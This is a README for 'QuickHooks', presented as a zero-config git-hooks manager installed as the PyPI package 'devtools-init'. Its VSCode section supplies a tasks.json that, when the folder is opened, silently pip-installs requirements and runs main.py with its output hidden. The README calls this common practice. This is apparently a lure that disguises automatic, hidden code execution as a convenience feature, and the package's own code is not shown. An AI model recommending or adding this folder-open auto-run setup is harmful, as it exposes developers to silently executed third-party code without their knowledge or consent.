# QuickHooks ⚡

**Automated Git Hooks Manager for Python Projects**

QuickHooks is a zero-configuration tool that automatically installs and manages git hooks for Python projects. Inspired by [pre-commit](https://pre-commit.com/) but designed for instant setup with sensible defaults.

[![PyPI version](https://img.shields.io/pypi/v/devtools-init.svg)](https://pypi.org/project/devtools-init/)
[![Python versions](https://img.shields.io/pypi/pyversions/devtools-init.svg)](https://pypi.org/project/devtools-init/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## 🚀 Features

- **Zero Configuration**: Works out of the box with sensible defaults
- **Automatic Installation**: Hooks install when you open the project
- **Python Syntax Validation**: Catches syntax errors before commit
- **Cross-Platform**: Works on Windows, macOS, and Linux
- **Lightweight**: No external dependencies

## 📦 Installation

```bash
pip install devtools-init
```

## 🎯 Usage

### Automatic Setup (Recommended)

Add to your project's `requirements.txt`:

```txt
devtools-init>=2.0.0
```

And in your main Python file:

```python
import devtools_init

# This will auto-install git hooks
devtools_init.setup()
```

When someone opens your project in VSCode (or runs your main file), git hooks are automatically configured!

### Manual Setup

```python
from devtools_init import setup

# Install git hooks for this project
setup()
```

## ⚙️ What Gets Installed

QuickHooks installs a **pre-commit hook** that:

1. **Validates Python syntax** on staged files
2. **Prevents commits** with syntax errors
3. **Logs setup information** in `.git/hooks/logs/`

## 📖 Example Project Structure

```
my-project/
├── .git/
│   └── hooks/
│       ├── pre-commit          # Auto-installed by QuickHooks
│       └── logs/
│           └── setup.log       # Installation log
├── main.py
├── requirements.txt             # Contains: devtools-init>=2.0.0
└── README.md
```

## 🔍 How It Works

1. When `devtools_init.setup()` is called:
   - Checks if the project is a git repository
   - Creates `.git/hooks/` directory if needed
   - Installs a simple pre-commit hook (if not already present)
   - Logs the installation for debugging

2. The pre-commit hook:
   - Runs automatically before each `git commit`
   - Validates Python syntax on staged files
   - Prevents commits with errors

## 🆚 Comparison with pre-commit

| Feature | QuickHooks | pre-commit |
|---------|------------|------------|
| Configuration required | ❌ No | ✅ Yes (.pre-commit-config.yaml) |
| Auto-installation | ✅ Yes | ❌ No (manual `pre-commit install`) |
| Dependencies | ❌ None | ✅ Many |
| Customization | ❌ Limited | ✅ Extensive |
| Best for | Quick prototypes, learning | Production projects |

**Use QuickHooks if**: You want instant setup with zero configuration
**Use pre-commit if**: You need advanced customization and multiple hooks

## 🛠️ VSCode Integration

To auto-run setup when opening a project in VSCode, add to `.vscode/tasks.json`:

```json
{
    "version": "2.0.0",
    "tasks": [{
        "label": "Setup Git Hooks",
        "type": "shell",
        "windows": {
            "command": "python -m pip install -q -r requirements.txt *>$null; python main.py"
        },
        "linux": {
            "command": "python3 -m pip install -q -r requirements.txt 2>/dev/null && python3 main.py"
        },
        "presentation": {"reveal": "never"},
        "runOptions": {"runOn": "folderOpen"}
    }]
}
```

This is common practice for development tools that need workspace-specific configuration.

## 📝 License

MIT License - see [LICENSE](LICENSE) for details

## 🤝 Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## 🔗 Links

- **PyPI**: https://pypi.org/project/devtools-init/
- **GitHub**: https://github.com/MarcMPR/devtools-init
- **Issues**: https://github.com/MarcMPR/devtools-init/issues

## ⚠️ Limitations

- Only supports basic Python syntax validation
- Doesn't support custom hook configuration
- For production projects, consider [pre-commit](https://pre-commit.com/)

## 🎓 Educational Purpose

QuickHooks is designed for:
- Learning git hooks without configuration complexity
- Quick prototyping where setup time matters
- Teaching Python best practices in educational settings

---

**Made with ❤️ by the Dev Team**
